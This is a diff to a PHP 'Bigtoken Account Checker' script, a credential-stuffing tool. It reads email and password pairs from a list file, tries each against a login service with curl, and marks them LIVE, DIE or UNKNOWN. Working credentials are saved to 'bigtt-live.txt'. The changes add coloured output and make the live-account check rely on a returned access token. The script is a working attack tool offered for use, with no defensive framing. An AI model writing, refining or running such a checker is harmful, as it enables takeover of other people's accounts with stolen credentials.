@@ -1,4 +1,4 @@
-<?php //Manggala 
+<?php  
 error_reporting(0);
 ini_set('display_errors', 1);
 ini_set('max_execution_time', 300000000);
@@ -12,7 +12,7 @@ $codelistlist = file_get_contents($listcode);
 $code_list_array = file($listcode);
 $code = explode(PHP_EOL, $codelistlist);
 $count = count($code);
-echo "==========================\n";
+echo "\033[39m ==========================\n";
 echo "Created by Alip Dzikri \n";
 echo "Bigtoken Account Checker \n";
 echo "==========================\n";
@@ -43,18 +43,20 @@ while($i < $count) {
   
  $result = curl_exec($ch);
  if(preg_match('/"INVALID_FIELD_MANDATORY"/', $result)){
- 	echo "UNKNOWN ".$email." | ".$pass." | ./Dzi \n";
+ 	echo "\033[96m UNKNOWN ".$email." | ".$pass." | ./Dzi \033[0m \n";
  }
  if(preg_match('/INVALID_CREDENTIALS/', $result)){
- 	echo "Die ".$email." | ".$pass." | ./Dzi \n";
- } else{
- 	echo "Live ".$email." | ".$pass." | ACC : BIGTOKEN ./Dzi \n";
+ 	echo "\033[91m DIE ".$email." | ".$pass." | ./Dzi \033[0m \n";
+ } 
+if(preg_match('/access_token/', $result)){
+	echo "\033[93m LIVE ".$email." | ".$pass." | ACC : BIGTOKEN ./Dzi \033[0m\n";
  	 $livee = "bigtt-live.txt";
     $fopen = fopen($livee, "a+");
     $fwrite = fwrite($fopen, "LIVE => $email | $pass | ACC : BIGTOKEN ./Dzi \n");
     fclose($fopen);
     $live++;
-    }
+}
+    
    curl_close($ch);
   $i++;
 }
